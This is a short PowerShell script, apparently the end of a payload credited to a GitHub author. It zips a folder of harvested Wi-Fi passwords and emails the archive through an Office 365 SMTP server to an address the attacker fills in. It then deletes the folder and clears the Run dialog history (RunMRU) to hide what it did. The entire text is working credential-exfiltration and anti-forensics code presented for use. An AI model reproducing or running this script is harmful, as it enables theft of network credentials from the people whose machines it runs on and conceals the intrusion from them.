Compress-Archive -Path wifi -DestinationPath wifi.zip
$SMTPServer = 'smtp.office365.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('SENDER EMAIL HERE', 'SENDER EMAIL PASSWORD HERE')
$wifimail = New-Object System.Net.Mail.MailMessage
$wifimail.From = 'SENDER EMAIL HERE'
$wifimail.To.Add('SEND TO EMAIL HERE')
$wifimail.Subject = "WiFi Passwords Script by GiKR-byte"
$wifimail.Body = "Here You Go... script by GiKR-byte on GitHub https://github.com/GiKR-byte"
$wifimail.Attachments.Add("wifi.zip")
$SMTPInfo.Send($wifimail)
Remove-Item wifi -Recurse -Force -Confirm:$false
REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
exit